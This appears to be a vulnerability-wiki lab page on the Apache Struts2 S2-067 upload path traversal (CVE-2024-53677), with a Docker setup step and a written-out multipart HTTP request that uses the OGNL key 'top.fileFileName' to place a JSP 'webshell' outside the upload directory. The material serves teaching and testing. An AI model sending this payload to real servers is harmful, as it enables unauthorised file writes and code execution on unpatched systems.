<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/struts2/s2-067/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Struts2 S2-067 Upload Path Traversal (CVE-2024-53677) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Struts2 S2-067 Upload Path Traversal (CVE-2024-53677)", url: "#_top", children: [
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "Vulnerability Reproduce", url: "#vulnerability-reproduce" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Struts2 S2-067 文件上传路径穿越漏洞（CVE-2024-53677）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../s2-066/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../s2-066/README.zh-cn/" class="btn btn-xs btn-link">
        Struts2 S2-066 文件上传路径穿越漏洞（CVE-2023-50164）
      </a>
    </div>
    
  </div>

    

    <h1 id="struts2-s2-067-upload-path-traversal-cve-2024-53677">Struts2 S2-067 Upload Path Traversal (CVE-2024-53677)<a class="headerlink" href="#struts2-s2-067-upload-path-traversal-cve-2024-53677" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Apache Struts2 is a popular open-source web application framework for developing Java EE web applications. It uses and extends the Java Servlet API to encourage developers to adopt a model–view–controller (MVC) architecture. The framework provides developers with a rich set of tags and utilities to create enterprise-ready web applications that are easy to maintain and extend.</p>
<p>S2-067 is a variant of the S2-066 vulnerability, which emerged due to an incomplete fix. While S2-066 was caused by case-sensitive comparison issues leading to filename override and directory traversal, S2-067 exploits a different mechanism to achieve the same result.</p>
<p>In Struts2, all parameter keys are evaluated as OGNL expressions during transmission. This feature has historically led to multiple remote code execution vulnerabilities through OGNL expression injection. Although Struts2 has implemented strict parameter key validation to prevent RCE vulnerabilities, the expression evaluation still occurs. S2-067 leverages this expression evaluation mechanism to override the upload filename again, ultimately leading to directory traversal issues.</p>
<p>References:</p>
<ul>
<li><a href="https://cwiki.apache.org/confluence/display/WW/s2-067">https://cwiki.apache.org/confluence/display/WW/s2-067</a></li>
<li><a href="https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/">https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/</a></li>
</ul>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Execute the following command to start a web server written in Struts2 2.5.33:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the environment is started, visit <code>http://your-ip:8080</code> to access the application, which is a simple file upload page.</p>
<h2 id="vulnerability-reproduce">Vulnerability Reproduce<a class="headerlink" href="#vulnerability-reproduce" title="Permanent link">&para;</a></h2>
<p>Before reproducing the S2-067 vulnerability, you need to read the <a href="../s2-066/">S2-066</a> first and understand the principle of the vulnerability.</p>
<p>On this server, you cannot use the same payload as in S2-066, because the case sensitivity issue has been fixed.</p>
<p><img alt="" src="1.png" /></p>
<p>Use OGNL expression <code>top.fileFileName</code> in the parameter key of filename, then the file will be uploaded to outside the <code>upload/</code> directory again:</p>
<div class="highlight"><pre><span></span><code>POST /index.action HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl6ZFZPznNSPZOFJF
Content-Length: 335

------WebKitFormBoundaryl6ZFZPznNSPZOFJF
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.jsp&quot;
Content-Type: text/plain

&lt;%
  out.println(&quot;hello world&quot;);
%&gt;
------WebKitFormBoundaryl6ZFZPznNSPZOFJF
Content-Disposition: form-data; name=&quot;top.fileFileName&quot;

../shell.jsp
------WebKitFormBoundaryl6ZFZPznNSPZOFJF--
</code></pre></div>
<p>Note the key elements in the exploit:</p>
<ul>
<li>Instead of using case sensitivity like in S2-066, we use OGNL expression evaluation in the parameter key</li>
<li>The parameter key <code>top.fileFileName</code> is evaluated as an OGNL expression</li>
<li>This evaluation allows us to override the filename with the path traversal payload <code>../shell.jsp</code></li>
</ul>
<p><img alt="Successful Upload" src="2.png" /></p>
<p>The JSP file is now uploaded outside the restricted upload directory and can be executed:</p>
<p><img alt="Webshell Execution" src="3.png" /></p>
<p>You can now access the webshell at <code>http://your-ip:8080/shell.jsp</code>.</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Struts2 S2-067 文件上传路径穿越漏洞（CVE-2024-53677）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../s2-066/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../s2-066/README.zh-cn/" class="btn btn-xs btn-link">
        Struts2 S2-066 文件上传路径穿越漏洞（CVE-2023-50164）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>